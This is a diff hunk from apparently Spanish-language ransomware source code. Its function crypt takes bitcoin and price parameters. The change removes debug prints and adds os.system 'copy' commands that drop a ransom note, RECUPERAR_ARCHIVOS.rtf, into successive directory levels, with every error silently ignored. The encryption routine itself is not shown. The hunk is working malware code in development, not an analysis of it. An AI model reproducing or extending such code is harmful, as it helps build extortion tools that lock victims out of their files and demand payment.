@@ -105,40 +105,45 @@ def crypt(text, pwd, path, bitcoin, price,verif ):
 			vari4=''
 			
 			vari4= (vari.split('\\'))
-			print(vari4)
 			for tex in vari3:
 				text0= (text0+tex+'\\')
 				if (verif != text0):
 					verif= text0
 					#Copy/Paste
 					try:
-						print("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\'+vari4[2]+'\\'+vari4[3]+'\\'+vari4[4]+'\\'+vari4[5]+'\\'+vari4[6]+'\\')
+						os.system("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\'+vari4[2]+'\\'+vari4[3]+'\\'+vari4[4]+'\\'+vari4[5]+'\\'+vari4[6]+'\\'+vari4[7]+'\\'+vari4[8]+'\\')
+					except (IOError, RuntimeError, TypeError, NameError, OSError, IndexError):
+						pass
+					try:
+						os.system("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\'+vari4[2]+'\\'+vari4[3]+'\\'+vari4[4]+'\\'+vari4[5]+'\\'+vari4[6]+'\\'+vari4[7]+'\\')
+					except (IOError, RuntimeError, TypeError, NameError, OSError, IndexError):
+						pass
+					try:
 						os.system("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\'+vari4[2]+'\\'+vari4[3]+'\\'+vari4[4]+'\\'+vari4[5]+'\\'+vari4[6]+'\\')
 					except (IOError, RuntimeError, TypeError, NameError, OSError, IndexError):
 						pass
 					try:
-						print("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\'+vari4[2]+'\\'+vari4[3]+'\\'+vari4[4]+'\\'+vari4[5]+'\\')
 						os.system("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\'+vari4[2]+'\\'+vari4[3]+'\\'+vari4[4]+'\\'+vari4[5]+'\\')
 					except (IOError, RuntimeError, TypeError, NameError, OSError, IndexError):
 						pass
 					try:
-						print("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\'+vari4[2]+'\\'+vari4[3]+'\\'+vari4[4]+'\\')
 						os.system("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\'+vari4[2]+'\\'+vari4[3]+'\\'+vari4[4]+'\\')
 					except (IOError, RuntimeError, TypeError, NameError, OSError, IndexError):
 						pass
 					try:
-						print("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\'+vari4[2]+'\\'+vari4[3]+'\\')
 						os.system("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\'+vari4[2]+'\\'+vari4[3]+'\\')
 					except (IOError, RuntimeError, TypeError, NameError, OSError, IndexError):
 						pass
 					try:
-						print("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\'+vari4[2]+'\\')
 						os.system("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\'+vari4[2]+'\\')
 					except (IOError, RuntimeError, TypeError, NameError, OSError, IndexError):
 						pass
 					try:
-						print("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\')
 						os.system("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\')
+					except (IOError, RuntimeError, TypeError, NameError, OSError, IndexError):
+						pass
+					try:
+						os.system("copy RECUPERAR_ARCHIVOS.rtf " +text0+'\\')
 					except (IOError, RuntimeError, TypeError, NameError, OSError, IndexError):
 						pass
 			#Return la lista de directorios
